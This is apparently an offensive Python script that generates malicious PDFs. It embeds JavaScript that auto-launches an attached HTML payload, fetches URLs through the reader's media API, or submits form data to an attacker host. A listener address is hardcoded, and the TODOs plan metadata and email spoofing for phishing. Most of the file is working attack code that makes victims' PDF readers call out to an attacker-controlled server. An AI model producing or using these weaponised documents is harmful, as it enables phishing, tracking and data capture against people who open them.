import PyPDF2
import jinja2
from jinja2 import Template
""" TODO:
    spoof metadata,
    start listener at specified url automatically,
    use better argument parsing and coloring like the ninja tool
    include email spoofing from this tool
    restrict test url based on compatible method choice
"""

test_urls = {
        'mailto': {
            'description': 'Sends a test email with user permission.',
            'url': 'mailto:danjaaron@gmail.com?subject=Testing&body=This is a test email.',
        },
        'google': {
            'description': 'Visits google.com',
            'url': 'www.google.com',
        },
        'img_src': {
            'description': 'Sources a wikimedia image',
            'url': 'https://upload.wikimedia.org/wikipedia/commons/f/f9/Phoenicopterus_ruber_in_S%C3%A3o_Paulo_Zoo.jpg'
        },
        'ip_src': {
            'description': 'Sources an image from attacker ip',
            'url': 'NA'
    }
}


def make_writer(pdf):
    with open(pdf, 'rb') as f:
        r = PyPDF2.PdfFileReader(f)
        w = PyPDF2.PdfFileWriter()
        w.appendPagesFromReader(r)
    return w


def method1(LHOST, LPORT, pdf="./dummy.pdf"):
    """ probe 1: attach html containing img with src url, launch html with JS """
    # make html payload 
    templateLoader = jinja2.FileSystemLoader(searchpath='./')
    templateEnv = jinja2.Environment(loader=templateLoader)
    TEMPLATE_FILE="template.html"
    template = templateEnv.get_template(TEMPLATE_FILE)
    load_url = "{0}:{1}".format(LHOST, LPORT)
    print('... ', load_url)
    render_out = template.render(URL=load_url)
    with open("payload.html", "wb+") as f:
        f.write(render_out)
    print(render_out)
    # attach payload and launcher to pdf 
    w = make_writer(pdf)
    w.addAttachment('payload.html', open('payload.html', 'rb'))
    w.addJS('this.exportDataObject({cName: "payload.html", nLaunch: 2,});')
    # write pdf out
    with open('./method1.pdf', 'wb+') as f:
        w.write(f)
    print("Wrote to method1.pdf")


def method2(url, pdf="./dummy.pdf"):
    """ probe 2: javascript getURLdata """
    # NOTE: visiting a url with this method requires the user to accept / trust in Foxit reader
    w = make_writer(pdf)
    #w.addJS('app.media.getURLData(http://{})'.format(url))
    w.addJS('var myURLClip = "http://{}.mp3";var args = {URL: myURLClip,mimeType: "audio/mp3",doc: this,settings: {players: app.media.getPlayers("audio/mp3"),windowType: app.media.windowType.floating,floating: {height: 72, width: 128},data: app.media.getURLData(myURLClip, "audio/mp3"),         showUI: true},};var settings = app.media.getURLSettings(args);args.settings = settings;app.media.openPlayer(args);'.format(url[:-3]))
    print('... ', url)
    with open('./method2.pdf', 'wb+') as f:
        w.write(f)
    print("Wrote to method2.pdf")

def method3(url, pdf="./dummy.pdf"):
    """ probe 3: javascript submitform to attacker url """
    # NOTE: visiting a url with this method requires the user to accept / trust in Foxit reader
    # ... probably higher rate with a direct phishing IP proxy and/or sending an html file attach
    w = make_writer(pdf)
    w.addJS('var url = "http://{}"; this.submitForm(url, false);'.format(url))
    with open('./method3.pdf', 'wb+') as f:
        w.write(f)
    print("Wrote to method3.pdf")


if __name__ == '__main__':
    
    # hardcoded for now
    LHOST = '192.168.1.134'
    LPORT = '8000/fake.png'
    source_ip = '{0}:{1}'.format(LHOST, LPORT)
    test_urls['ip_src']['url'] = source_ip

    method = int(raw_input('> METHOD #: '))
    if method == 1:
        # launch attached html 
        method1(LHOST, LPORT)
    else:
        header = "="*10 + " SELECT A TEST URL " + "="*10
        footer = "="*len(header)
        print(header)
        for key_idx, key in enumerate(list(test_urls.keys())):
            print("{0}: {1}".format(key_idx, key))
            for k, v in test_urls[key].items():
                print(" ...{0}: {1}".format(k, v))
        print(footer)
        # handle test url selection
        selection = -1
        while not (0 <= selection and selection < len(test_urls)):
            selection = int(raw_input("> SELECT URL #: "))
        selected_url = test_urls[list(test_urls.keys())[selection]]
        url = selected_url['url']
        # handle method selection
        # default to method3 for now
        if method == 3:
            method3(url)
        elif method == 2:
            method2(url)
